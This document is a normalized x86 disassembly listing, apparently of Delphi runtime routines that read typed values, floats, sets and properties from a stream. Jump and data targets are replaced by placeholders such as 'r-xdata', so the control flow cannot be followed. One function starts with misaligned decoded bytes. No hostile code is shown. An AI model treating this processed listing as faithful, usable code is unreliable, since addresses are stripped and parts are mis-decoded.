mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403234
sub_41e290
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e300
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41e2eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e300
mov eax [ ebp - 0x4 ]
call sub_41d850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d994
retn
sub_41e300
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d738
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e808
mov eax [ ebp - 0x4 ]
call sub_41e6a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403430
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41e3c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403430
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d738
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e054
mov eax [ ebp - 0x4 ]
call sub_41e6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3c9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41e3d0
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41f4dc
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e658
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41daa0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41e414
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41f4dc
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e658
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41daa0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41e458
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41f4dc
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e658
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41daa0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41e4a8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41f4dc
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e658
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41daa0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41e4ec
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41f4dc
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41d578
mov al [ eax + lookup_table_41e513 ]
jmp [ eax * 4 + jump_table_41e521 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41daa0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040f8
mov eax esi
call j_sub_4044d4#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41daa0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41e5ec
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41f4dc
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41daa0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41daa0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41daa0
jmp r-xdata
jmp r-xdata
call sub_41d578
sub_41e658
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41da7c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41e5ec
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41f4dc
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41daa0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41e6ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41da7c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41f4dc
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41e5ec
mov [ edi ] eax
sub_41e6e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e7dd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404008
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7e4
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
sub_41e808
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e9d8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403800#8
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41f300
xor edx edx
push ebp
push j_sub_403800#9
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404528
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403474
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4167c8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403474
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4167c8
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41eb8c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41da8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41da8c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_416870
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41e7ec
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9df
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edi ebx
jmp r-xdata
sub_41e9a0
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4039e8
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9df
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_41e9e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_419e5c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d578
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4168e4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ea30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d00c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a30c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ea70
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41eabf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41fbf4
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4173cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eac6
lea eax [ ebp - 0x10 ]
call sub_40f300
retn
sub_41eacc
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41eb7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41da7c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e4ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d00c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a30c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f4dc
lea eax [ ebp - 0x4 ]
call sub_405a38
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4174a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb85
lea eax [ ebp - 0x8 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_41eb8c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ee87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee8e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x24 ]
call sub_404714
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
retn
jmp [ eax * 4 + jump_table_41ec1c ]
mov eax [ rw-data ]
call sub_41d560
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416870
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da7c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db3c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41e4ec
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_416764
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3d0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417180
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41f33c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416e80
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41f3f8
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416f94
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f220
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da7c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da7c
cmp al 0xd
jne r-xdata
push ebp
call sub_41ea70
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e658
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41746c
jmp r-xdata
push ebp
call sub_41eacc
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416870
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e5ec
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e4ec
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e9e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4dc
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e4
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41e4ec
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4dc
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41740c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4dc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416870
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41db94
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41740c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41e4ec
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ea30
pop ecx
jmp r-xdata
sub_41ee94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40405c
jmp r-xdata
mov eax [ ebx ]
call sub_419ff4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40905c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eef4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f20f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f2dc
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41f1ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f1ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41f300
mov eax [ ebp - 0x1c ]
call sub_419bc8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41ee94
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40317c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419918
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41f153
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406168
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41f133
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a4c4
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f13a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403234
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_41a468
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41f184
call sub_40282c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a3c
jmp r-xdata
call sub_4039e8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41d288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1f4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41f1b3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41d430
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039e8
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1f4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403234
sub_41f220
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f2ca
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f29d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f4dc
cmp al 0xb
je r-xdata
mov eax ebx
call sub_416634
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41d578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41d5b0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2d1
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41f300
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41daa0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040f8
mov eax esi
call j_sub_4044d4#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41daa0
pop edx
pop esi
pop ebx
retn
sub_41f33c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f3e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41da7c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41f3f8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404290
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3f0
lea eax [ ebp - 0x8 ]
call sub_404714
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41f4dc
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41daa0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404654
